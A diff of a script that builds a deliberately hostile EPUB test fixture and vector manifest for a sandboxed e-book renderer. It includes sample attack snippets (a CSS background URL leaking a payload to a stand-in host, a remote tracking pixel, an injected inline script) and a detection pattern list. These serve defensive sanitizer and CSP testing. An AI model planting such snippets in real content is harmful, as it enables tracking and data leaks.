+    id: 'heading-markup',
+    sectionId: 'preserve',
+    source: PRESERVE,
+    expectation: 'preserved',
+    selector: '#preserve-heading',
+    description: 'Ordinary headings.',
+    snippet: '<h1 id="preserve-heading">What Must Survive</h1>',
+  }),
+  vector({
+    id: 'inline-emphasis',
+    sectionId: 'preserve',
+    source: PRESERVE,
+    expectation: 'preserved',
+    description: 'Inline <em> and <strong>.',
+    snippet: 'kept <em>two</em> ledgers and <strong>never</strong> the same one twice',
+  }),
+  vector({
+    id: 'list-markup',
+    sectionId: 'preserve',
+    source: PRESERVE,
+    expectation: 'preserved',
+    description: 'A well-formed list with three items.',
+    snippet: '<li>Salt, in barrels.</li>',
+  }),
+  vector({
+    id: 'blockquote-markup',
+    sectionId: 'preserve',
+    source: PRESERVE,
+    expectation: 'preserved',
+    description: 'A blockquote wrapping a paragraph.',
+    snippet: '<blockquote><p>We are paid to remember what the tide forgets.</p></blockquote>',
+  }),
+  vector({
+    id: 'table-markup',
+    sectionId: 'preserve',
+    source: PRESERVE,
+    expectation: 'preserved',
+    description: 'A table with a head and a body.',
+    snippet: '<thead><tr><th>Ledger</th><th>Entries</th></tr></thead>',
+  }),
+  vector({
+    id: 'fragment-link',
+    sectionId: 'preserve',
+    source: PRESERVE,
+    expectation: 'preserved',
+    description: 'A same-document fragment link. resolve() returns undefined for it by design, which must not be read as damage.',
+    snippet: '<a href="#page_357">Back to page 357</a>',
+  }),
+
+  vector({
+    id: 'img-local-resource',
+    sectionId: 'resources',
+    source: RESOURCES,
+    expectation: 'preserved',
+    selector: '#local-image',
+    description: 'An image that resolves inside the archive; its src must become a blob: URL and load.',
+    snippet: '<img id="local-image" src="../images/dot.png" alt="A single dot"/>',
+  }),
+  vector({
+    id: 'external-stylesheet',
+    sectionId: 'resources',
+    source: RESOURCES,
+    expectation: 'preserved',
+    selector: '#local-stylesheet',
+    description: 'A linked stylesheet from inside the archive.',
+    snippet: '<link id="local-stylesheet" rel="stylesheet" type="text/css" href="../styles/main.css"/>',
+  }),
+  vector({
+    id: 'css-import-local',
+    sectionId: 'resources',
+    source: MAIN_CSS,
+    expectation: 'preserved',
+    description: 'An @import of a second local stylesheet, written the way books write it - relative to the importing stylesheet, not to the section.',
+    snippet: '@import url("second.css");',
+    note: 'main.css lives in OEBPS/styles/ and the section in OEBPS/text/. Section.resolve() is section-relative, so the host must compose the reference in relative space (dirname of the link href, joined with the import target) before resolving. Resolving "second.css" straight from the section lands on OEBPS/text/second.css and returns undefined.',
+  }),
+  vector({
+    id: 'css-url-relative-to-stylesheet',
+    sectionId: 'resources',
+    source: SECOND_CSS,
+    expectation: 'preserved',
+    selector: '#css-url-image',
+    description: 'A url() inside an imported stylesheet pointing at an image that only exists relative to that stylesheet (OEBPS/styles/assets/plate.png).',
+    snippet: '.plate { background-image: url("assets/plate.png"); width: 24px; height: 24px; }',
+    note: 'The same relative-base trap as css-import-local, one level deeper: the base is second.css, which was itself reached through an @import.',
+  }),
+  vector({
+    id: 'css-font-face-url',
+    sectionId: 'resources',
+    source: MAIN_CSS,
+    expectation: 'preserved',
+    selector: '#font-face-text',
+    description: 'An @font-face src pointing at a font inside the archive.',
+    snippet: '@font-face { font-family: "Hostile Stub"; src: url("../fonts/stub.woff") format("woff"); }',
+    note: 'The .woff bytes are a stub, so the face will not render glyphs. What is assertable here is the rewrite and the resolution, not the typography.',
+  }),
+  vector({
+    id: 'inline-style-url',
+    sectionId: 'resources',
+    source: RESOURCES,
+    expectation: 'preserved',
+    selector: '#inline-style-url',
+    description: 'A url() in an inline style attribute, whose base is the section itself.',
+    snippet: '<div id="inline-style-url" style="background-image: url(../images/dot.png); width: 24px; height: 24px;">',
+  }),
+  vector({
+    id: 'css-import-cycle',
+    sectionId: 'resources',
+    source: CYCLE_A_CSS,
+    expectation: 'preserved',
+    selector: '#cycle-stylesheet',
+    description: 'cycle-a.css imports cycle-b.css. Following @import chains recursively must terminate rather than hang.',
+    snippet: '@import url("cycle-b.css");',
+  }),
+  vector({
+    id: 'css-import-cycle-back',
+    sectionId: 'resources',
+    source: CYCLE_B_CSS,
+    expectation: 'preserved',
+    description: 'cycle-b.css imports cycle-a.css straight back, closing the cycle.',
+    snippet: '@import url("cycle-a.css");',
+  }),
+  vector({
+    id: 'remote-stylesheet',
+    sectionId: 'resources',
+    source: RESOURCES,
+    expectation: 'inert',
+    selector: '#remote-stylesheet',
+    description: 'A linked stylesheet on a remote origin. Nothing may be fetched.',
+    snippet: '<link id="remote-stylesheet" rel="stylesheet" type="text/css" href="https://example.invalid/remote.css"/>',
+  }),
+  vector({
+    id: 'remote-image',
+    sectionId: 'resources',
+    source: RESOURCES,
+    expectation: 'inert',
+    selector: '#remote-image',
+    description: 'A remote tracking pixel. This one proves the CSP rather than the sanitizer: img-src blob: is what must stop it.',
+    snippet: '<img id="remote-image" src="https://example.invalid/pixel.png" alt="A tracking pixel"/>',
+  }),
+  vector({
+    id: 'css-remote-import',
+    sectionId: 'resources',
+    source: MAIN_CSS,
+    expectation: 'inert',
+    description: 'An @import of a remote stylesheet.',
+    snippet: '@import url(https://example.invalid/x.css);',
+  }),
+  vector({
+    id: 'css-remote-background',
+    sectionId: 'resources',
+    source: MAIN_CSS,
+    expectation: 'inert',
+    selector: '#css-remote-background',
+    description: 'The CSS-only exfiltration channel: a background image on a remote origin with the payload in the query string.',
+    snippet: '.leak { background-image: url(https://example.invalid/?leak=css); }',
+  }),
+  vector({
+    id: 'declared-missing-image',
+    sectionId: 'resources',
+    source: RESOURCES,
+    expectation: 'preserved',
+    selector: '#declared-missing-image',
+    description: 'An image declared in the manifest whose zip entry was never written; resolve() returns undefined. The element must degrade without throwing and the alt must come back as text, so the sentence reads "Declared in the manifest".',
+    snippet: '<img id="declared-missing-image" src="../images/declared-missing.png" alt="D"/>',
+  }),
+  vector({
+    id: 'undeclared-present-image',
+    sectionId: 'resources',
+    source: RESOURCES,
+    expectation: 'preserved',
+    selector: '#undeclared-image',
+    description: 'An image present in the archive but absent from the manifest. The manifest is the only statement of a media type, so resolve() returns undefined here too - a different failure class with the same graceful outcome, and the sentence must read "Undeclared in the manifest".',
+    snippet: '<img id="undeclared-image" src="../images/undeclared-present.png" alt="U"/>',
+  }),
+
+  vector({
+    id: 'declared-scripted-script',
+    sectionId: 'scripted-declared',
+    source: SCRIPTED,
+    expectation: 'removed',
+    probe: '__pwned_declared_scripted',
+    description: 'The control for the unconditional-sanitization criterion: the same inline script, in the one section whose manifest item declares properties="scripted". Its treatment must be identical to inline-script in the undeclared section.',
+    snippet: '<script>window.__pwned_declared_scripted = 1;</script>',
+  }),
+];
+
+// Any construct a naive host might execute, load or navigate. Every match has
+// to sit inside some vector's snippet, or the manifest has drifted from the
+// fixture - which is worse than having no manifest at all.
+const RISK_PATTERNS = [
+  /<script\b/gi,
+  /<iframe\b/gi,
+  /<object\b/gi,
+  /<embed\b/gi,
+  /<base\b/gi,
+  /<form\b/gi,
+  /<meta\s+http-equiv/gi,
+  /<use\b/gi,
+  /<foreignObject\b/gi,
+  /<animate\b/gi,
+  /<set\b/gi,
+  /<param\b/gi,
+  /\son[a-zA-Z]+\s*=/gi,
+  /javascript:/gi,
+  /&#\d+;/g,
+  /@import/gi,
+  /url\(/gi,
+  /example\.invalid/gi,
+  /<a\b[^>]*\/>/gi,
+  /x-ebookmaker-pageno/gi,
+];
+
+function checkHostileVectors(entries, vectors) {
+  const text = new Map(entries.map((entry) => [entry.name, Buffer.from(entry.data).toString('utf-8')]));
+  const spine = [...text.get('OEBPS/content.opf').matchAll(/<itemref idref="([^"]+)"/g)].map((m) => m[1]);
+  const ids = new Set();
+  const probes = new Set();
+  const spans = new Map();
+
+  for (const v of vectors) {
+    if (ids.has(v.id)) throw new Error(`duplicate vector id: ${v.id}`);
+    ids.add(v.id);
+    if (v.probe !== undefined) {
+      if (probes.has(v.probe)) throw new Error(`probe ${v.probe} is shared by more than one vector`);
+      probes.add(v.probe);
+    }
+    if (!spine.includes(v.sectionId)) throw new Error(`vector ${v.id} names a section outside the spine: ${v.sectionId}`);
+    if (!['removed', 'inert', 'preserved'].includes(v.expectation)) {
+      throw new Error(`vector ${v.id} has an unknown expectation: ${v.expectation}`);
+    }
+    const source = text.get(v.source);
+    if (source === undefined) throw new Error(`vector ${v.id} names a file the archive does not carry: ${v.source}`);
+    const at = source.indexOf(v.snippet);
+    if (at === -1) throw new Error(`vector ${v.id}: snippet is not in ${v.source}`);
+    if (source.indexOf(v.snippet, at + 1) !== -1) throw new Error(`vector ${v.id}: snippet is not unique in ${v.source}`);
+    if (!spans.has(v.source)) spans.set(v.source, []);
+    spans.get(v.source).push([at, at + v.snippet.length]);
+  }
+
+  for (const [name, source] of text) {
+    if (!/\.(xhtml|svg|css|js)$/.test(name)) continue;
+    const covered = spans.get(name) ?? [];
+    for (const pattern of RISK_PATTERNS) {
+      for (const match of source.matchAll(pattern)) {
+        if (!covered.some(([start, end]) => match.index < end && match.index + match[0].length > start)) {
+          throw new Error(
+            `${name}: ${JSON.stringify(match[0])} at offset ${match.index} is not covered by any vector snippet`,
+          );
+        }
+      }
+    }
+  }
+}
+
+checkHostileVectors(hostileEntries, hostileVectors);
+
+writeFileSync(join(outDir, 'hostile.epub'), buildZip(hostileEntries));
+
+writeFileSync(
+  join(outDir, 'hostile-vectors.json'),
+  JSON.stringify(
+    {
+      fixture: 'hostile.epub',
+      purpose:
+        'The contract the sandboxed content host is tested against. Every construct in hostile.epub appears here, and every entry here appears in hostile.epub; make-epub-fixtures.mjs fails to write either file if that stops being true.',
+      fields: {
+        id: 'Stable name for the vector.',
+        sectionId: 'Section (spine item id) that surfaces it.',
+        source: 'Zip entry the snippet literally appears in - the section document itself, or a stylesheet it pulls in.',
+        expectation:
+          'removed: must not survive into the rendered document. inert: may survive structurally but must not execute or navigate. preserved: MUST survive; removing it is a bug.',
+        probe: 'Global name a test asserts never appears. Unique per vector, so one failure cannot mask another.',
+        selector: 'Where present, a CSS selector for the element in the rendered document.',
+        snippet: 'The exact text in `source`, used to prove this list and the fixture agree.',
+        note: 'Anything about the vector that is not obvious from the markup.',
+      },
+      sections: [
+        {
+          id: 'attacks',
+          path: 'OEBPS/text/attacks.xhtml',
+          scriptedDeclared: false,
+          purpose: 'HTML script execution, navigation and embedding vectors, in head and body.',
+        },
+        {
+          id: 'svg-attacks',
+          path: 'OEBPS/text/svg-attacks.xhtml',
+          scriptedDeclared: false,
+          purpose: 'Inline SVG: a separate parsing context with its own script element, its own handler surface, xlink attributes, foreignObject and SMIL.',
+        },
+        {
+          id: 'svg-document',
+          path: 'OEBPS/text/hostile.svg',
+          scriptedDeclared: false,
+          purpose: 'A spine item that is itself image/svg+xml, so the section document has no HTML wrapper at all.',
+        },
+        {
+          id: 'malformed',
+          path: 'OEBPS/text/malformed.xhtml',
+          scriptedDeclared: false,
+          purpose: 'Not well-formed XML on purpose: the text/html fallback path, plus the parser-confusion and encoding tricks that only exist there.',
+        },
+        {
+          id: 'preserve',
+          path: 'OEBPS/text/preserve.xhtml',
+          scriptedDeclared: false,
+          purpose: 'What a careless sanitizer breaks: zero-width page anchors, a self-closing non-void tag, an unresolvable drop-cap image, and ordinary structural markup.',
+        },
+        {
+          id: 'resources',
+          path: 'OEBPS/text/resources.xhtml',
+          scriptedDeclared: false,
+          purpose: 'Resource loading and the exfiltration channels: blob-rewritable references, an @import chain and cycle, and remote references that prove the CSP.',
+        },
+        {
+          id: 'scripted-declared',
+          path: 'OEBPS/text/scripted-declared.xhtml',
+          scriptedDeclared: true,
+          purpose: 'The only section declaring properties="scripted". It exists so the pair proves sanitization does not branch on the declaration.',
+        },
+      ],
+      unconditionalSanitization:
+        'Every attack vector except declared-scripted-script sits in a section whose manifest item does NOT declare properties="scripted". Section.scripted is an author declaration, not a detection, so a fixture that carried its attacks only behind the declaration could not prove that sanitization is unconditional. The one declared section carries the identical inline script for A/B comparison.',
+      vectors: hostileVectors,
+    },
+    null,
+    2,
+  ) + '\n',
+);
+
 console.log('fixtures written to', outDir);
